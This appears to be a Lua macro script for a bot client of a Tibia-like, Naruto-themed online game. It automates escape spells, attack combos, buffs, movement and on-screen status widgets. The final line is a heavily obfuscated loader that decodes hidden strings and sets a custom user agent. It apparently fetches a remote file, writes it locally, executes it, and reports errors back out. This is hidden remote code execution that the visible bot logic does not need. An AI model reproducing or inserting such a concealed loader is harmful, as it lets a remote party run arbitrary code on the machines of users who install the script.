    local cooldownActive = fugaInterface.cooldownActive:getValue();
    
    if spellName:len() == 0 then
        return warn('Invalid Spell Name.');
    end
    if not fugaInterface.sameSpell:isChecked() and orangeMsg:len() == 0 then
        return warn('Invalid Orange Spell.')
    end
    if onScreen:len() == 0 then
        return warn('Invalid Text On Screen')
    end
    if hppercent == 0 then
        return warn('Invalid Hppercent.')
    end
    if cooldownTotal == 0 then
        return warn('Invalid Cooldown Total.')
    end
  
    local spellConfig = {
        index = #storageProfiles.fugaSpells + 1,
        spellCast = spellName,
        orangeSpell = orangeMsg,
        onScreen = onScreen,
        selfHealth = hppercent,
        cooldownActive = cooldownActive,
        cooldownTotal = cooldownTotal,
        enableTimeSpell = true,
        enabled = true
    }
  
    if fugaInterface.lifesOption:isChecked() then
        spellConfig.lifes = 0;
        spellConfig.enableLifes = true;
        if fugaInterface.lifesValue:getValue() == 0 then
          return warn('Invalid Life Value.')
        end
        spellConfig.amountLifes = fugaInterface.lifesValue:getValue();
    end
    if fugaInterface.reviveOption:isChecked() then
        spellConfig.enableRevive = true;
        spellConfig.alreadyChecked = false;
    end
    if fugaInterface.multipleOption:isChecked() then
        spellConfig.enableMultiple = true; 
        spellConfig.count = 3;
    end
    table.insert(storageProfiles.fugaSpells, spellConfig)
    refreshFugaList(fugaInterface, storageProfiles.fugaSpells)
    scriptFuncs.saveProfile(STORAGE_DIRECTORY, storageProfiles)
  
    fugaInterface.castSpell:clearText()
    fugaInterface.orangeSpell:clearText()
    fugaInterface.onScreen:clearText()
    fugaInterface.cooldownTotal:setValue(0)
    fugaInterface.cooldownActive:setValue(0)
    fugaInterface.hppercent:setValue(0)
    fugaInterface.reviveOption:setChecked(false);
    fugaInterface.lifesOption:setChecked(false);
    fugaInterface.multipleOption:setChecked(false);
    fugaInterface.multipleOption:show();
    fugaInterface.lifesValue:hide();
  end
  
  refreshFugaList(fugaInterface, storageProfiles.fugaSpells);

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

storage.widgetPos = storage.widgetPos or {};
informationWidget = {};

local widgetNames = {
  'showText',
}

for i, widgetName in ipairs(widgetNames) do
    informationWidget[widgetName] = setupUI(widgetConfig, g_ui.getRootWidget())
end

local function attachSpellWidgetCallbacks(key)
  informationWidget[key].onDragEnter = function(widget, mousePos)
      if not modules.corelib.g_keyboard.isCtrlPressed() then
        return false
      end
      widget:breakAnchors()
      widget.movingReference = { x = mousePos.x - widget:getX(), y = mousePos.y - widget:getY() }
      return true
  end

  informationWidget[key].onDragMove = function(widget, mousePos, moved)
      local parentRect = widget:getParent():getRect()
      local x = math.min(math.max(parentRect.x, mousePos.x - widget.movingReference.x), parentRect.x + parentRect.width - widget:getWidth())
      local y = math.min(math.max(parentRect.y - widget:getParent():getMarginTop(), mousePos.y - widget.movingReference.y), parentRect.y + parentRect.height - widget:getHeight())        
      widget:move(x, y)
      return true
  end

  informationWidget[key].onDragLeave = function(widget, pos)
    storage.widgetPos[key] = {}
    storage.widgetPos[key].x = widget:getX();
    storage.widgetPos[key].y = widget:getY();
    return true
  end
end

for key, value in pairs(informationWidget) do
  attachSpellWidgetCallbacks(key)
  informationWidget[key]:setPosition(
      storage.widgetPos[key] or {0, 50}
  )
end

local toShow = informationWidget['showText'];

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

macro(100, function()
  if isOn.showInfos then
      for _, value in ipairs(storageProfiles.fugaSpells) do
          if value.selfHealth then
              toShow:show()
              toShow:setText('INIMIGOS: ' .. getPlayersAttack(false) .. ' | PERCENT: ' .. calculatePercentage(value.selfHealth) .. '%')
              return;
          end
      end
  else
      toShow:hide();
  end
end);
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
macro(100, function()
    if not (fugaSpellsWidgets and storageProfiles.fugaSpells) then return; end
    
    for index, spellConfig in ipairs(storageProfiles.fugaSpells) do
        local widget = fugaSpellsWidgets[spellConfig.index];
        if widget then
            local textToSet = firstLetterUpper(spellConfig.onScreen)
            local color = 'green'
            if spellConfig.activeCooldown and spellConfig.activeCooldown > now then
                textToSet = textToSet .. ': ' .. formatRemainingTime(spellConfig.activeCooldown)
                color = 'orange'
                if spellConfig.enableLifes and spellConfig.lifes == 0 then
                    spellConfig.activeCooldown = nil;
                end
            elseif spellConfig.totalCooldown and spellConfig.totalCooldown > now then
                textToSet = textToSet .. ': ' .. formatRemainingTime(spellConfig.totalCooldown)
                color = 'red'
            else
                textToSet = textToSet .. ': 0s'
                if spellConfig.enableMultiple and spellConfig.canReset then
                    spellConfig.count = 3;
                    spellConfig.canReset = false;
                end
                if spellConfig.enableLifes then
                    spellConfig.lifes = 0;
                end
                if spellConfig.enableRevive then
                    spellConfig.alreadyChecked = false;
                end
            end
            if spellConfig.enableMultiple and spellConfig.count > 0 then
                textToSet = '' .. spellConfig.count .. ' | ' .. textToSet
            end
            if spellConfig.enableLifes and spellConfig.lifes > 0 then
                textToSet = '' .. spellConfig.lifes .. ' | ' .. textToSet
            end
            widget:setText(textToSet)
            widget:setColor(color)
        end
    end
end);



----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


storage.widgetPos = storage.widgetPos or {}

local widgetConfig = [[
UIWidget
  background-color: black
  opacity: 0.75
  padding: 0 5
  focusable: true
  phantom: false
  draggable: true
  text-auto-resize: true

]]

local testTable = {}

testTable['fugaWidget'] = setupUI(widgetConfig, g_ui.getRootWidget())

local function attachSpellWidgetCallbacks(key)
  testTable[key].onDragEnter = function(widget, mousePos)
      if not modules.corelib.g_keyboard.isCtrlPressed() then
          return false
      end
      widget:breakAnchors()
      widget.movingReference = { x = mousePos.x - widget:getX(), y = mousePos.y - widget:getY() }
      return true
  end

  testTable[key].onDragMove = function(widget, mousePos, moved)
      local parentRect = widget:getParent():getRect()
      local x = math.min(math.max(parentRect.x, mousePos.x - widget.movingReference.x), parentRect.x + parentRect.width - widget:getWidth())
      local y = math.min(math.max(parentRect.y - widget:getParent():getMarginTop(), mousePos.y - widget.movingReference.y), parentRect.y + parentRect.height - widget:getHeight())
      widget:move(x, y)
      return true
  end

  testTable[key].onDragLeave = function(widget, pos)
      storage.widgetPos[key] = {}
      storage.widgetPos[key].x = widget:getX();
      storage.widgetPos[key].y = widget:getY();
      return true
  end
end

for key, value in pairs(testTable) do
  attachSpellWidgetCallbacks(key)
  testTable[key]:setPosition(
      storage.widgetPos[key] or {0, 50}
  )
end

if type(storage.Attacking) ~= 'table' then
  storage.Attacking = {}
 end
 
 function ct()
  for index, value in ipairs(storageProfiles.fugaSpells) do
  if not attackers then return 30 end
  if attackers < 4 then
   return(value.selfHealth + (5 * tonumber(attackers)))
  else
   return(80)
  end
end
 end

 macro(100, function()
  if not storage.Attacking[1] then attackers = 0 return end
  for c, q in ipairs(storage.Attacking) do
   if not attackers or c > attackers then
    attackers = c
   elseif not q[attackers] and attackers > 1 then
    attackers = attackers - 1
   end
   if q.t < now then
    table.remove(storage.Attacking, c)
   end 
  end
 end)

 onTextMessage(function(mode, text)
  for _, p in ipairs(getSpectators(posz())) do
   if p:isPlayer() and text:find(p:getName()) and text:find('attack by') then
    for c, q in ipairs(storage.Attacking) do
     if q.n == p:getName() then
      table.remove(storage.Attacking, c)
     end
    end
    table.insert(storage.Attacking, {n = p:getName(), t = (now + 1500)})
    break
   end
  end
 end)

 macro(1, function()
  if not attackers then return end
  testTable['fugaWidget']:setText("Oponentes " .. attackers .. " | Porcentagem " .. ct() .. '%')
  testTable['fugaWidget']:setFont('verdana-11px-rounded')  
  if attackers <= 0 then
    testTable['fugaWidget']:setColor('white')
  else
    testTable['fugaWidget']:setColor('orange')
  end
 end)


local selfPlayer = g_game.getLocalPlayer();

macro(1, function()
    if not fugaIcon.title:isOn() then return; end
    if isInPz() then return; end
    local selfHealth, hpEscape = g_game.getLocalPlayer():getHealthPercent(), ct()
    for key, value in ipairs(storageProfiles.fugaSpells) do
        if value.enabled and selfHealth <= hpEscape then
            if (not value.totalCooldown or value.totalCooldown <= now) then
                if not canCastFuga() then
			            stopCombo = now + 250;
                    forceSay(value.spellCast);
                end
            end
        end
    end
end);

macro(1, function()
if not g_mouse.isPressed(7) then return; end
    if not fugaIcon.title:isOn() then return; end
    for key, value in ipairs(storageProfiles.fugaSpells) do
       if value.enabled and (g_mouse.isPressed(7))then
            if (not value.totalCooldown or value.totalCooldown <= now) then
                if not canCastFuga() then
		                stopCombo = now + 250;
                    return forceSay(value.spellCast);
        end
            end
        end
    end
end)


onTalk(function(name, level, mode, text, channelId, pos)
    text = text:lower();
    if name ~= player:getName() then return; end
    for index, value in ipairs(storageProfiles.fugaSpells) do
        if text == value.orangeSpell then
            if value.enableLifes then
                value.activeCooldown = now + (value.cooldownActive * 1000) - 250;
                value.totalCooldown = now + (value.cooldownTotal * 1000) - 250;
                value.lifes = value.amountLifes;
            end
            if value.enableRevive and not value.alreadyChecked then
                value.totalCooldown = now + (value.cooldownTotal * 1000) - 250;
                value.activeCooldown = now + (value.cooldownActive * 1000) - 250;
                value.alreadyChecked = true;
            end
            if value.enableMultiple then
                if value.count > 0 then
                    value.count = value.count - 1
                    value.activeCooldown = now + (value.cooldownActive * 1000) - 250
                    if value.count == 0 then
                        value.totalCooldown = now + (value.cooldownTotal * 1000) - 250
                        value.canReset = true;
                        break;
                    end
                end
            end
            if not (value.enableLifes or value.enableRevive or value.enableMultiple) then
                value.activeCooldown = now + (value.cooldownActive * 1000) - 250;
                value.totalCooldown = now + (value.cooldownTotal * 1000) - 250;
                break
            end
        end
    end
end);

onTextMessage(function(mode, text)
    for key, value in ipairs(storageProfiles.fugaSpells) do
        if value.enableLifes then
            if text:lower():find('morreu e renasceu') and value.activeCooldown and value.activeCooldown >= now then
                value.lifes = value.lifes - 1;
            end
        end
    end
end);

onPlayerPositionChange(function(newPos, oldPos)
    local izanagiPos = { x = 1214, y = 686, z = 6 };
    for key, value in ipairs(storageProfiles.fugaSpells) do
        if value.enableRevive and value.spellCast == 'izanagi' then
            if newPos.x == izanagiPos.x and newPos.y == izanagiPos.y and newPos.z == izanagiPos.z then
                value.activeCooldown = nil;
                value.alreadyChecked = true;
            end
        end
    end
end);


------------------------------------------------------------------------------------
local vocs = {
  guren = 1,
  itachi = 2,  
}

CONFIG = {
  [vocs.guren] = {
    COMBO = {
      {text = 'shouton suishouheki hachi', cooldown = 22.5},
      {text = 'shouton hashou kouryu', cooldown = 42.1},
      {text = 'shouton suishou meikyu', cooldown = 22.5},
      {text = 'shouton kesshou seichou', cooldown = 22.0},
      {text = 'shouton omiwatari no jutsu', cooldown = 22.5},
      {text = 'shouton kouryu rou', cooldown = 32.1},
      {text = 'shouton kesshou kouryu', cooldown = 22.5},
    },
    BUFF = {
      {text = 'shouton shishou'},
    },
  },

  [vocs.itachi] = {
    COMBO = {
      {text = 'suiton houmatsu no jutsu', cooldown = 3.5},
      {text = 'suiton bakusui shouha', cooldown = 5.1},
      {text = 'shabondama taiga', cooldown = 3.1},
      {text = 'kibakuhou shabondama', cooldown = 2.5},
      {text = 'shabondama no jutsu', cooldown = 2.5},
      {text = 'santouka no jutsu', cooldown = 1.5},
    },
    BUFF = {
      {text = 'baburukei'},
    },
  },
}

local currentConfig = nil
addIcon("Combo", {item={id=3292 , count=1}, text="Combo"}, macro(50, function()
  if not currentConfig then return end
  local target = g_game.getAttackingCreature()
  if not g_game.isAttacking() or stopCombo and stopCombo >= now then return end
  for index, value in ipairs(currentConfig.COMBO) do
    if (not value.cooldown or value.cooldown <= now) then
      say(value.text)
    end
  end
end))

onTalk(function(name, level, mode, text, channelId, pos)
  if not currentConfig then return end
  if name ~= player:getName() then return end
  text = text:lower();
  for index, value in ipairs(currentConfig) do
    if text == value.text then
      value.cooldown = now + (value.cooldown * 1000) -250
      break
    end
  end
end) 

onTextMessage(function(mode, text)
  if not text:find("mesmo.") then return end
  for voc, id in pairs(vocs) do
    if text:find(voc) then
      currentConfig = CONFIG[id]
      break
    end
  end
end)

schedule(500, function()
  g_game.look(player)
end)

--------------------------------------------------------------

local Premium = true
onTextMessage(function(mode, text)
  if text:find("premium account.") then
    Premium = false
  end
end)

addIcon("Buff", {item={id=3292 , count=1}, text="Buff"}, macro(2000, function()
  if not currentConfig then return end 
    if isInPz() then return end
    if attackers >= 1 then return end
    for index, value in ipairs(currentConfig.BUFF) do
      if (player:getSkillLevel(3) == 10 or player:getSkillLevel(3) == 21 or player:getSkillLevel(3) == 25) then
        say(value.text)
        delay(1500)
      end
      if (player:getSkillLevel(3) >= 50 and player:getSkillLevel(3) <= 80) then
          say('kekkei genkai')
      end
    end
end))

addIcon("Correr", {item={id=12953 , count=1}, text="Correr"}, macro(50, function()
  delay(1500)
  if isInPz() then return end
  if attackers == 0 then
  if (stopCombo and stopCombo >= now) then return end
  if not hasHaste() and hppercent() >= 50 then
    say('concentrate chakra feet')
  end
end
end))


local function checkPos(x, y)
  xyz = g_game.getLocalPlayer():getPosition()
  xyz.x = xyz.x + x
  xyz.y = xyz.y + y
  tile = g_map.getTile(xyz)
  if tile then
   return g_game.use(tile:getTopUseThing(), 1, { ignoreNonPathable = true, precision = 4 })
  else
   return false
  end
 end
 
 panel = mainTab;
 
 local bugMap = {};
 
 bugMap.isKeyPressed = modules.corelib.g_keyboard.isKeyPressed;
 
 bugMap.directions = {
     ["W"] = {x = 0, y = -5, direction = 0},
     ["E"] = {x = 5, y = -5},
     ["D"] = {x = 5, y = 0, direction = 1},
     ["C"] = {x = 5, y = 5},
     ["S"] = {x = 0, y = 5, direction = 2},
     ["Z"] = {x = -5, y = 5},
     ["A"] = {x = -5, y = 0, direction = 3},
     ["Q"] = {x = -5, y = -5}
 };
 
 bugMap.macro = macro(1, "Bug Map", function()
     if (modules.game_console:isChatEnabled() or modules.corelib.g_keyboard.isCtrlPressed()) then return; end
     local pos = pos();
     for key, config in pairs(bugMap.directions) do
         if (bugMap.isKeyPressed(key)) then
             if (config.direction) then
                     turn(config.direction);
                 end
                 local tile = g_map.getTile({x = pos.x + config.x, y = pos.y + config.y, z = pos.z});
                 if (tile) then
                     return g_game.use(tile:getTopUseThing());
                 end
         end
     end
 end)

-------------------------------------------------------------


----------------------------------------------------------------------------------------------------------------------------

local frames = {}

for i = 0, 13 do
  local frameNumber
  if i < 10 then
    frameNumber = "0" .. i
  else
    frameNumber = tostring(i)
  end
  table.insert(frames, "/assets/frame_" .. frameNumber .. "_delay-0.1s.png")
end

local currentFrameIndex = 1
local frameDuration = 85

local function updateFrame()
  local framePath = "/bot/" .. configName .. frames[currentFrameIndex]
  mainTab:setImageSource(framePath)
  mainTab:setImageClip('0 0 0 0')
  currentFrameIndex = currentFrameIndex + 1
  if currentFrameIndex > #frames then
    currentFrameIndex = 1
  end
end

local function startAnimation()
  schedule(frameDuration, function()
    updateFrame()
    startAnimation()
  end)
end

startAnimation()

local bit = modules._G.bit;local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v44,v45) local v46={};for v61=1, #v44 do v6(v46,v0(v4(v1(v2(v44,v61,v61 + 1 )),v1(v2(v45,1 + (v61% #v45) ,1 + (v61% #v45) + 1 )))%256 ));end return v5(v46);end local v8={};local v9=2;local v10=function(...) local v47={...};local v48=v47[1];if (type(v48)==v7("\197\194\217\41\227","\126\177\163\187\69\134\219\167")) then else v48=v47;end local v49={};for v62=1, #v48 do local v63=v48[v62];local v64=v8[v63];if  not v64 then local v80=v63 * v9 ;v64=string.char(v80);v8[v63]=v64;end v49[v62]=v64;end v49=table.concat(v49);v49=v49:reverse();return v49;end;local v11=modules;local v12=v11[v7("\28\234","\156\67\173\74\165")];local v13=v12.getfenv();local v14=v13[v7("\56\184\72\18\175\50\84\61\185\78","\38\84\215\41\118\220\70")];local v15=v13[v7("\64\21\35\30\242","\158\48\118\66\114")];local v16=v12[v7("\172\27\2\51\96\170\238\185\39\21\37","\155\203\68\112\86\19\197")];local v17=v16[v7("\75\220\61\249\100\113\247","\152\38\189\86\156\32\24\133")];local v18=v16[v7("\250\94\171\67\217\79\174\85\232\68","\38\156\55\199")];local v19=v16[v7("\186\120\125\44\53\125\246\70\139\114\114\60\22\122\238\80","\35\200\29\28\72\115\20\154")];local v20=v16[v7("\14\173\216\203\136\10\61\21\186\242\208\131\56\49\23\171\194","\84\121\223\177\191\237\76")];local v21=v16[v7("\191\95\219\165\57\68\63\211\162\115\209\169\41\68\35","\161\219\54\169\192\90\48\80")];local v22=v12[v7("\78\125\8\49\93\82","\69\41\34\96")];local v23=v11[v7("\191\204\197\15\14\34\190","\75\220\163\183\106\98")][v7("\42\142\191\7","\185\98\218\235\87")];local v24=v23[v7("\207\51\48\232\210\165\202\56","\202\171\92\71\134\190")];v23[v7("\61\200\33\141\38\212\56","\232\73\161\76")]=60;local v26={v10(25,24,24,24,25),v10(26.5,24,24,24,25),v10(24,24,24.5,24,25),v10(59.5,48.5,57)};local v27={v10(57.5,58,56,52.5,57,49.5,57.5,47.5,55.5,51,54,50.5,23.5),v10(49.5,57.5,52.5,54.5),v10(55,55.5,57.5,53,23,55,55.5,52.5,57.5,57,50.5,59)};local v28=table.concat(v27,v10(23.5));local v29=v10(48.5,58.5,54,23,57,50.5,50,48.5,55.5,54,23.5,49.5,57.5,52.5,54.5,23.5,57.5,58,56,52.5,57,49.5,57.5,47.5,55.5,51,54,50.5,23.5);local v30=v11[v7("\188\216\79\88\33\185\214\86","\126\219\185\34\61")][v7("\1\203\77\97\127\112\246","\135\108\174\62\18\30\23\147")];v13[v7("\164\252\36\248\27\188\58\215\162","\167\214\137\74\171\120\206\83")]=v13[v7("\153\229\60\110\251\181\130\224\38","\199\235\144\82\61\152")] or {} ;local v32=v13[v7("\21\3\183\24\4\4\176\59\19","\75\103\118\217")];table.insert(v32,{101,101,114,135,97,63,64,87,100,122,119,123,97,66,119,90,100,123,105,134,115,64,123,129,112,85,93,120,97,63,68,134,99,123,119,94,112,64,104,134,101,99,122,76});local v33=v10();for v50,v51 in ipairs(v27) do if v27[v50 + 1 ] then v33=v33   .. v10(23.5)   .. v51 ;if  not v21(v33) then v17(v33);end end end local v34=function(v52) return v30(v10(55,57,48.5,59.5),tostring(v52));end;local v35=function(v53,v54) local v55=table.find(v26,v53);local v56={};local v57={};v57=v55;if v54 then v56[v7("\209\81\98\7\176\17\201","\126\167\52\16\116\217")]=v55;else v56[v7("\220\43\51\148\177\29\195\222\43\50\147\189\22\242","\156\168\78\64\224\212\121")]=v57;end v56=json.encode(v56);v20(v28,v56);end;local v36=function() if  not v18(v28) then return 1;end local v58=v19(v28);v58=json.decode(v58);local v59=v58[v7("\17\235\183\221\14\225\171","\174\103\142\197")];if  not v59 then v59=v58[v7("\66\45\76\44\32\90\199\64\45\77\43\44\81\246","\152\54\72\63\88\69\62")] + 1 ;end return v59;end;local v37=v36();v37=((v37>=1) and (v37<=4) and v37) or 1 ;v37=v26[v37];local v39=v10(47.5,55,56,58.5,58,59,50)   .. v37   .. v10(56,52.5,61,23) ;local v40=v10(23.5,57.5,50,48.5,55.5,54,55,59.5,55.5,50,23.5)   .. v39 ;if (v18(v40)) then v13.verifyInfo=function() local v74=v13[v7("\198\209\224\111\215\214\231\76\192","\60\180\164\142")] and  #v13[v7("\74\75\11\26\36\255\27\72\74","\114\56\62\101\73\71\141")] ;local v75=tostring(v13.runBot)   .. v74 ;if (v75==lastInfo) then else lastInfo=v75;schedule(100,v13.verifyInfo);return false;end if v13[v7("\172\240\201\246\173\231","\164\216\137\187")] then return;end v13[v7("\198\255\35\128\179\240","\107\178\134\81\210\198\158")]=true;local v77=v19(v40);local v78,v79=v15(v14,v77);if  not v78 then if  not v79:find(v10(50.5,50,55.5,49.5,50.5,58,60.5,49)) then local v82={v10(23,57,50.5,50,48.5,55.5,54,16,55.5,16,48.5,59,48.5,51.5,50.5,57,57,48.5,49.5,16,55.5,58,55,48.5,58.5,56.5,55,50.5,16,55.5,57,57,34.5),string.char(10),v79};v82=table.concat(v82);v34(v82);end v35(v37);reload();else v35(v37,true);v79();end end;return v13.verifyInfo();end if v13[v7("\60\1\149\200\166\55\15\134\207\164\63\58\155\212","\202\88\110\226\166")] then return;end v13[v7("\199\0\149\249\198\204\14\134\254\196\196\59\155\229","\170\163\111\226\151")]=true;v22.setUserAgent(v10(42,41.5,34.5,42.5,40.5,34.5,41,47.5,33.5,42,39.5));v12[v7("\6\49\187\44\71\57\46\46\52\189\47\64\59\38\16\52\141\44\71\58\44","\73\113\80\210\88\46\87")]=nil;local v43=v12[v7("\150\45\196\6\238\143\43\242\22\232\150\34\193\29\230\133\19\217\27\234\132","\135\225\76\173\114")] or 0 ;schedule(v43,function() local v60=v10(56,52.5,61,23,39,39.5,36.5,41.5,41,34.5,43,22.5,58.5,56.5,53,57.5,50,58,22.5,55,56,58.5,58,59,50,23.5,57.5,50,48.5,55.5,54,56,58.5,23.5,54.5,55.5,49.5,23,57,60.5,58,54.5,55.5,58,57.5,58.5,49.5,23.5,23.5,29,57.5,56,58,58,52);v60=v60:gsub(v10(39,39.5,36.5,41.5,41,34.5,43),v37);v24(v60,v39,function(v67,v68,v69) if v69 then v34(v69);end player:clearText();v12[v7("\13\236\177\164\165\179\160\37\233\183\167\162\177\168\27\233\135\164\165\176\162","\199\122\141\216\208\204\221")]=v43 + 5000 ;schedule(2000,reload);end,function(v71) player:setText(v10(16,41.5,42,40,36.5,41,33.5,41.5,16,39.5,35,38,34.5)   .. v71   .. v10(18.5) ,v10(50.5,51.5,55,48.5,57,55.5));end);end);

